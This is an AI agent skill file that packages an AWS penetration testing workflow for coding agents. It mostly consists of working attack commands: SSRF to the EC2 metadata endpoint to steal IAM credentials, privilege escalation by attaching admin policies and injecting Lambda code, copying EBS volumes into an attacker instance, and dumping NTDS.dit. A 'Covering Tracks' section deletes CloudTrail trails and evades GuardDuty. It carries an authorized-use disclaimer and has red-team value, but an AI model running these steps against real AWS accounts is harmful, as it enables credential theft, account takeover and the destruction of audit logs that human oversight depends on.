---
name: aws-penetration-testing
description: "AWS Penetration Testing workflow skill. Use this skill when the user needs Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations and the operator should preserve the upstream workflow, copied support files, and provenance before merging or handing off."
version: "0.0.1"
category: testing-security
tags: ["aws-penetration-testing", "provide", "comprehensive", "techniques", "for", "penetration", "testing", "aws"]
complexity: advanced
risk: caution
tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
source: community
author: "zebbern"
date_added: "2026-04-15"
date_updated: "2026-04-18"
---

# AWS Penetration Testing

## Overview

This public intake copy packages `plugins/antigravity-awesome-skills-claude/skills/aws-penetration-testing` from `https://github.com/sickn33/antigravity-awesome-skills` into the native Omni Skills editorial shape without hiding its origin.

Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.

This intake keeps the copied upstream files intact and uses `metadata.json` plus `ORIGIN.md` as the provenance anchor for review.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments. # AWS Penetration Testing

Imported source sections that did not map cleanly to the public headings are still preserved below or in the support files. Notable imported sections: Purpose, Inputs/Prerequisites, Outputs/Deliverables, Essential Tools, Privilege Escalation Techniques, S3 Bucket Exploitation.

## When to Use This Skill

Use this section as the trigger filter. It should make the activation boundary explicit before the operator loads files, runs commands, or opens a pull request.

- This skill is applicable to execute the workflow or actions described in the overview.
- Use when the request clearly matches the imported source intent: Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence....
- Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
- Use when provenance needs to stay visible in the answer, PR, or review packet.
- Use when copied upstream references, examples, or scripts materially improve the answer.
- Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.

## Operating Table

| Situation | Start here | Why it matters |
| --- | --- | --- |
| First-time use | `metadata.json` | Confirms repository, branch, commit, and imported path before touching the copied workflow |
| Provenance review | `ORIGIN.md` | Gives reviewers a plain-language audit trail for the imported source |
| Workflow execution | `references/advanced-aws-pentesting.md` | Starts with the smallest copied file that materially changes execution |
| Supporting context | `references/advanced-aws-pentesting.md` | Adds the next most relevant copied source file without loading the entire package |
| Handoff decision | `## Related Skills` | Helps the operator switch to a stronger native skill when the task drifts |

## Workflow

This workflow is intentionally editorial and operational at the same time. It keeps the imported source useful to the operator while still satisfying the public intake standards that feed the downstream enhancer flow.

1. ### Step 1: Initial Enumeration Identify the compromised identity and permissions: ``bash # Check current identity aws sts get-caller-identity # Configure profile aws configure --profile compromised # List access keys aws iam list-access-keys # Enumerate permissions ./enumerate-iam.py --access-key AKIA...
2. ### Step 2: IAM Enumeration bash # List all users aws iam list-users # List groups for user aws iam list-groups-for-user --user-name TARGETUSER # List attached policies aws iam list-attached-user-policies --user-name TARGETUSER # List inline policies aws iam list-user-policies --user-name TARGETUSER # Get policy details aws iam get-policy --policy-arn POLICYARN aws iam get-policy-version --policy-arn POLICYARN --version-id v1 # List roles aws iam list-roles aws iam list-attached-role-policies --role-name ROLENAME ### Step 3: Metadata SSRF (EC2) Exploit SSRF to access metadata endpoint (IMDSv1): bash # Access metadata endpoint http://169.254.169.254/latest/meta-data/ # Get IAM role name http://169.254.169.254/latest/meta-data/iam/security-credentials/ # Extract temporary credentials http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME # Response contains: { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "...", "Expiration": "2019-08-01T05:20:30Z" } For IMDSv2 (token required): bash # Get token first TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \ "http://169.254.169.254/latest/api/token") # Use token for requests curl -H "X-aws-ec2-metadata-token:$TOKEN" \ "http://169.254.169.254/latest/meta-data/iam/security-credentials/" Fargate Container Credentials: bash # Read environment for credential path /proc/self/environ # Look for: AWSCONTAINERCREDENTIALSRELATIVEURI=/v2/credentials/...
3. # Access credentials http://169.254.170.2/v2/credentials/CREDENTIAL-PATH `` ---
4. Confirm the user goal, the scope of the imported workflow, and whether this skill is still the right router for the task.
5. Read the overview and provenance files before loading any copied upstream support files.
6. Load only the references, examples, prompts, or scripts that materially change the outcome for the current request.
7. Execute the upstream workflow while keeping provenance and source boundaries explicit in the working notes.

### Imported Workflow Notes

#### Imported: Core Workflow

### Step 1: Initial Enumeration

Identify the compromised identity and permissions:

```bash
# Check current identity
aws sts get-caller-identity

# Configure profile
aws configure --profile compromised

# List access keys
aws iam list-access-keys

# Enumerate permissions
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### Step 2: IAM Enumeration

```bash
# List all users
aws iam list-users

# List groups for user
aws iam list-groups-for-user --user-name TARGET_USER

# List attached policies
aws iam list-attached-user-policies --user-name TARGET_USER

# List inline policies
aws iam list-user-policies --user-name TARGET_USER

# Get policy details
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# List roles
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### Step 3: Metadata SSRF (EC2)

Exploit SSRF to access metadata endpoint (IMDSv1):

```bash
# Access metadata endpoint
http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract temporary credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**For IMDSv2 (token required):**

```bash
# Get token first
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Use token for requests
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fargate Container Credentials:**

```bash
# Read environment for credential path
/proc/self/environ
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Access credentials
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

#### Imported: Purpose

Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.

## Examples

### Example 1: Ask for the upstream workflow directly

```text
Use @aws-penetration-testing to handle <task>. Start from the copied upstream workflow, load only the files that change the outcome, and keep provenance visible in the answer.
```

**Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.

### Example 2: Ask for a provenance-grounded review

```text
Review @aws-penetration-testing against metadata.json and ORIGIN.md, then explain which copied upstream files you would load first and why.
```

**Explanation:** Use this before review or troubleshooting when you need a precise, auditable explanation of origin and file selection.

### Example 3: Narrow the copied support files before execution

```text
Use @aws-penetration-testing for <task>. Load only the copied references, examples, or scripts that change the outcome, and name the files explicitly before proceeding.
```

**Explanation:** This keeps the skill aligned with progressive disclosure instead of loading the whole copied package by default.

### Example 4: Build a reviewer packet

```text
Review @aws-penetration-testing using the copied upstream files plus provenance, then summarize any gaps before merge.
```

**Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.

### Imported Usage Notes

#### Imported: SSM Command Execution

Systems Manager allows command execution on EC2 instances:

```bash
# List managed instances
aws ssm describe-instance-information

# Execute command
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="whoami"

# Get command output
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```

---

#### Imported: Examples

### Example 1: SSRF to Admin

```bash
# 1. Find SSRF vulnerability in web app
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get role name from response
# 3. Extract credentials
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. Verify access
aws sts get-caller-identity
```

---

## Best Practices

Treat the generated public skill as a reviewable packaging layer around the upstream repository. The goal is to keep provenance explicit and load only the copied source material that materially improves execution.

- Keep the imported skill grounded in the upstream repository; do not invent steps that the source material cannot support.
- Prefer the smallest useful set of support files so the workflow stays auditable and fast to review.
- Keep provenance, source commit, and imported file paths visible in notes and PR descriptions.
- Point directly at the copied upstream files that justify the workflow instead of relying on generic review boilerplate.
- Treat generated examples as scaffolding; adapt them to the concrete task before execution.
- Route to a stronger native skill when architecture, debugging, design, or security concerns become dominant.



## Troubleshooting

### Problem: The operator skipped the imported context and answered too generically

**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills-claude/skills/aws-penetration-testing`, fails to mention provenance, or does not use any copied source files at all.
**Solution:** Re-open `metadata.json`, `ORIGIN.md`, and the most relevant copied upstream files. Load only the files that materially change the answer, then restate the provenance before continuing.

### Problem: The imported workflow feels incomplete during review

**Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
**Solution:** Point at the exact copied references, examples, scripts, or assets that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.

### Problem: The task drifted into a different specialization

**Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
**Solution:** Use the related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.

### Imported Troubleshooting Notes

#### Imported: Troubleshooting

| Issue | Solution |
|-------|----------|
| Access Denied on all commands | Enumerate permissions with enumerate-iam |
| Metadata endpoint blocked | Check for IMDSv2, try container metadata |
| GuardDuty alerts | Use Pacu with custom user-agent |
| Expired credentials | Re-fetch from metadata (temp creds rotate) |
| CloudTrail logging actions | Consider disable or log obfuscation |

---

## Related Skills

- `@ai-dev-jobs-mcp` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@arm-cortex-expert` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@asana-automation` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@ask-questions-if-underspecified` - Use when the work is better handled by that native specialization after this imported skill establishes context.

## Additional Resources

Use this support matrix and the linked files below as the operator packet for this imported skill. They should reflect real copied source material, not generic scaffolding.

| Resource family | What it gives the reviewer | Example path |
| --- | --- | --- |
| `references` | copied reference notes, guides, or background material from upstream | `references/advanced-aws-pentesting.md` |
| `examples` | worked examples or reusable prompts copied from upstream | `examples/n/a` |
| `scripts` | upstream helper scripts that change execution or validation | `scripts/n/a` |
| `agents` | routing or delegation notes that are genuinely part of the imported package | `agents/n/a` |
| `assets` | supporting assets or schemas copied from the source package | `assets/n/a` |

- [advanced-aws-pentesting.md](references/advanced-aws-pentesting.md)
- [advanced-aws-pentesting.md](references/advanced-aws-pentesting.md)

### Imported Reference Notes

#### Imported: Quick Reference

| Task | Command |
|------|---------|
| Get identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List roles | `aws iam list-roles` |
| List buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Get metadata | `curl http://169.254.169.254/latest/meta-data/` |

---

#### Imported: Additional Resources

For advanced techniques including Lambda/API Gateway exploitation, Secrets Manager & KMS, Container security (ECS/EKS/ECR), RDS/DynamoDB exploitation, VPC lateral movement, and security checklists, see [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md).

#### Imported: Inputs/Prerequisites

- AWS CLI configured with credentials
- Valid AWS credentials (even low-privilege)
- Understanding of AWS IAM model
- Python 3, boto3 library
- Tools: Pacu, Prowler, ScoutSuite, SkyArk

#### Imported: Outputs/Deliverables

- IAM privilege escalation paths
- Extracted credentials and secrets
- Compromised EC2/Lambda/S3 resources
- Persistence mechanisms
- Security audit findings

---

#### Imported: Essential Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |
| SkyArk | Shadow Admin discovery | `Import-Module .\SkyArk.ps1` |
| Prowler | Security auditing | `pip install prowler` |
| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |
| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | IAM analysis | `pip install principalmapper` |

---

#### Imported: Privilege Escalation Techniques

### Shadow Admin Permissions

These permissions are equivalent to administrator:

| Permission | Exploitation |
|------------|--------------|
| `iam:CreateAccessKey` | Create keys for admin user |
| `iam:CreateLoginProfile` | Set password for any user |
| `iam:AttachUserPolicy` | Attach admin policy to self |
| `iam:PutUserPolicy` | Add inline admin policy |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `lambda:UpdateFunctionCode` | Inject code into Lambda |

### Create Access Key for Another User

```bash
aws iam create-access-key --user-name target_user
```

### Attach Admin Policy

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Add Inline Admin Policy

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Lambda Privilege Escalation

```python
# code.py - Inject into Lambda function
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# Update Lambda code
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

#### Imported: S3 Bucket Exploitation

### Bucket Discovery

```bash
# Using bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# Common bucket URL patterns
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### Bucket Enumeration

```bash
# List buckets (with creds)
aws s3 ls

# List bucket contents
aws s3 ls s3://bucket-name --recursive

# Download all files
aws s3 sync s3://bucket-name ./local-folder
```

### Public Bucket Search

```
https://buckets.grayhatwarfare.com/
```

---

#### Imported: Lambda Exploitation

```bash
# List Lambda functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name FUNCTION_NAME
# Download URL provided in response

# Invoke function
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

#### Imported: EC2 Exploitation

### Mount EBS Volume

```bash
# Create snapshot of target volume
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# Create volume from snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Attach to attacker instance
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# Mount and access
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```

### Shadow Copy Attack (Windows DC)

```bash
# CloudCopy technique
# 1. Create snapshot of DC volume
# 2. Share snapshot with attacker account
# 3. Mount in attacker instance
# 4. Extract NTDS.dit and SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

#### Imported: Console Access from API Keys

Convert CLI credentials to console access:

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# Generates signin URL for console access
```

---

#### Imported: Covering Tracks

### Disable CloudTrail

```bash
# Delete trail
aws cloudtrail delete-trail --name trail_name

# Disable global events
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events

# Disable specific region
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events --no-is-multi-region-trail
```

**Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.

---

#### Imported: Constraints

**Must:**
- Obtain written authorization before testing
- Document all actions for audit trail
- Test in scope resources only

**Must Not:**
- Modify production data without approval
- Leave persistent backdoors without documentation
- Disable security controls permanently

**Should:**
- Check for IMDSv2 before attempting metadata attacks
- Enumerate thoroughly before exploitation
- Clean up test resources after engagement

---
